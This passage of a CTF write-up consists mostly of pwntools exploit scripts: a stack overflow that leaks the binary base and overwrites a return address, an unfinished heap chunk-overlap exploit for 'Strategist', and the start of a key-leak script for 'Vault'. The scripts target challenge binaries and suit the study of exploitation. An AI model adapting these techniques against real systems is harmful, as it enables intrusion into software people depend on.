</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;age again?</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&gt; &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;-1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    input(<span style="color:#e6db74">&#39;[continue]&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;in combat?</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&gt; &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;C&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;[Specialty]: &#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;C&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>))
</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[+] leak             : &#39;</span> <span style="color:#f92672">+</span> hex(leak))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    binary<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> binary<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>__libc_csu_init
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[+] binary base      : &#39;</span> <span style="color:#f92672">+</span> hex(binary<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[+] @win             : &#39;</span> <span style="color:#f92672">+</span> hex(binary<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>contract))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[*] setting specialty&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Specialty</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&gt; &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;you good at: &#39;</span>)<span style="color:#f92672">.</span>decode())
</span></span><span style="display:flex;"><span>    off_to_verified <span style="color:#f92672">=</span> <span style="color:#ae81ff">28</span>
</span></span><span style="display:flex;"><span>    off_to_self <span style="color:#f92672">=</span> off_to_verified <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;O&#39;</span><span style="color:#f92672">*</span>off_to_verified <span style="color:#f92672">+</span> p32(<span style="color:#f92672">-</span><span style="color:#ae81ff">100</span>, signed<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xf0</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># override `verified`</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#75715e"># so we can continue to modify fields</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#75715e"># (and trigger the BOF as well !)</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#75715e"># we should set it to 0 when we </span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#75715e"># are ready to exploit</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># landed, now enumerate</span>
</span></span><span style="display:flex;"><span>    offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> offset <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x128</span>:
</span></span><span style="display:flex;"><span>        ret <span style="color:#f92672">=</span> try_override_verified(offset)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ret <span style="color:#f92672">!=</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>            base, offset <span style="color:#f92672">=</span> ret
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        offset <span style="color:#f92672">+=</span> <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    off_to_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x118</span><span style="color:#f92672">-</span>(offset<span style="color:#f92672">+</span>OFF_VERIFIED_TO_RET)
</span></span><span style="display:flex;"><span>    rebased_lsb <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf0</span><span style="color:#f92672">-</span>(<span style="color:#ae81ff">0x118</span><span style="color:#f92672">-</span>(offset<span style="color:#f92672">+</span>OFF_VERIFIED_TO_RET))
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[?] return address is </span><span style="color:#e6db74">{</span>off_to_ret<span style="color:#e6db74">}</span><span style="color:#e6db74"> far from `specialization` field&#39;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[+] setting pointer LSB to&#39;</span>, hex(rebased_lsb))
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    input(<span style="color:#e6db74">&#39;[Type ENTER to rebase pointer]&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;no&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#p.interactive()</span>
</span></span><span style="display:flex;"><span>    rebase_pointer_lsb(offset, rebased_lsb)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[+] pointer rebased ! overwriting return address from `specialization` field&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    input(<span style="color:#e6db74">&#39;[Type ENTER to overwrite return address]&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(p64(binary<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>contract))
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Yes&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="pwn---strategist">PWN - Strategist<a href="#pwn---strategist" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p><strong><em>Work In Progress</em></strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_plan</span>(data, size<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;your plan?</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&gt; &#39;</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>    size <span style="color:#f92672">=</span> size <span style="color:#f92672">or</span> len(data)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[+] Creating plan of size </span><span style="color:#e6db74">{</span>size<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>size<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    resp <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;grand failure&#34;</span> <span style="color:#f92672">in</span> resp:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;malloc failed!&#39;</span>)
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.05</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(data)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;in mind.</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show_plan</span>(id):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;to view?</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&gt; &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    resp <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;no such plan&#39;</span> <span style="color:#f92672">in</span> resp:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Invalid plan to show </span><span style="color:#e6db74">{</span>id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(resp)
</span></span><span style="display:flex;"><span>        start <span style="color:#f92672">=</span> resp<span style="color:#f92672">.</span>find(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Plan [</span><span style="color:#e6db74">{</span>id<span style="color:#e6db74">}</span><span style="color:#e6db74">]: &#34;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> start <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            end <span style="color:#f92672">=</span> resp<span style="color:#f92672">.</span>find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, start)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> resp[start<span style="color:#f92672">+</span>len(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Plan [</span><span style="color:#e6db74">{</span>id<span style="color:#e6db74">}</span><span style="color:#e6db74">]: &#34;</span><span style="color:#f92672">.</span>encode()): end]
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete_plan</span>(id):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;to delete?</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&gt; &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    resp <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;no such plan&#39;</span> <span style="color:#f92672">in</span> resp:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Invalid plan to delete </span><span style="color:#e6db74">{</span>id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit_plan</span>(id, data):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;to change?</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&gt; &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    resp <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;no such plan&#34;</span> <span style="color:#f92672">in</span> resp:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Invalid plan to edit </span><span style="color:#e6db74">{</span>id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;your new plan.</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&gt; &#39;</span> <span style="color:#f92672">in</span> resp:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+] Writing new plan&#39;</span>)
</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.05</span>)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[+] Sending new plan (content=</span><span style="color:#e6db74">{</span>data<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#39;</span>)
</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>send(data)
</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    subparsers <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>add_subparsers(dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;command&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    parser_local <span style="color:#f92672">=</span> subparsers<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#39;local&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    parser_remote <span style="color:#f92672">=</span> subparsers<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#39;remote&#39;</span>)
</span></span><span style="display:flex;"><span>    parser_remote<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;host&#39;</span>)
</span></span><span style="display:flex;"><span>    parser_remote<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;port&#39;</span>, type<span style="color:#f92672">=</span>int)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-b&#39;</span>, <span style="color:#e6db74">&#39;--binary&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;local binary path&#39;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-l&#39;</span>, <span style="color:#e6db74">&#39;--libc&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;local libc path&#39;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>) <span style="color:#75715e"># remove if libc not needed</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;local&#39;</span>:
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> process(args<span style="color:#f92672">.</span>binary, env<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;LD_LIBRARY_PATH&#39;</span>: os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>dirname(args<span style="color:#f92672">.</span>libc)})
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;remote&#39;</span>:
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> remote(args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>port)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>print_help()
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    binary <span style="color:#f92672">=</span> ELF(args<span style="color:#f92672">.</span>binary)
</span></span><span style="display:flex;"><span>    libc <span style="color:#f92672">=</span> ELF(args<span style="color:#f92672">.</span>libc)
</span></span><span style="display:flex;"><span>    rop <span style="color:#f92672">=</span> ROP(binary)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    create_plan(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span>)
</span></span><span style="display:flex;"><span>    create_plan(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x508</span>)
</span></span><span style="display:flex;"><span>    create_plan(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span>)
</span></span><span style="display:flex;"><span>    create_plan(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x4c8</span>)
</span></span><span style="display:flex;"><span>    create_plan(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span>)
</span></span><span style="display:flex;"><span>    gdb<span style="color:#f92672">.</span>attach(p)
</span></span><span style="display:flex;"><span>    input(<span style="color:#e6db74">&#39;Start exploit&#39;</span>)
</span></span><span style="display:flex;"><span>    delete_plan(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    edit_plan(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span> <span style="color:#f92672">+</span> p16((<span style="color:#ae81ff">0x550</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffc</span>) <span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>    input(<span style="color:#e6db74">&#39;Start exploit&#39;</span>)
</span></span><span style="display:flex;"><span>    edit_plan(<span style="color:#ae81ff">3</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x550</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffc</span>) )
</span></span><span style="display:flex;"><span>    input(<span style="color:#e6db74">&#39;Start exploit&#39;</span>)
</span></span><span style="display:flex;"><span>    size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x538</span>
</span></span><span style="display:flex;"><span>    create_plan(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x548</span>)
</span></span><span style="display:flex;"><span>    delete_plan(<span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#edit_plan(1, b&#34;A&#34;*0x508)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#leak = u64(show_plan(1)[0x518:].ljust(8, b&#34;\x00&#34;))</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#print(&#39;pointer into main arena = &#39;,hex(leak))</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#libc.address = leak - 0x3EBC40</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#libc.address = leak - libc.symbols[&#34;__malloc_hook&#34;] + 0x10</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#print(&#39;libc base = &#39;,hex(libc.address))</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="pwn---vault">PWN - Vault<a href="#pwn---vault" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>Did not have time to pwn this challenge. I started working at the end of the event and found interesting things, but not enough to pwn it yet. I might continue this challenge and post write-up.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./vault&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_leak_encryption_key</span>(byte_idx, idx):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(idx)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;URL: &#39;</span>)
</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;http://&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">128</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;:&#39;</span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(url)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Password: &#39;</span>)
</span></span><span style="display:flex;"><span>    plain <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>byte_idx <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>byte_idx<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) 
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(plain)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>)
</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    leak_start <span style="color:#f92672">=</span> leak<span style="color:#f92672">.</span>find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">128</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">128</span>
</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> bytes([ plain[i] <span style="color:#f92672">^</span> leak[i] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(leak[leak_start:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]))])
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> key
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_encryption_key</span>():
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>)
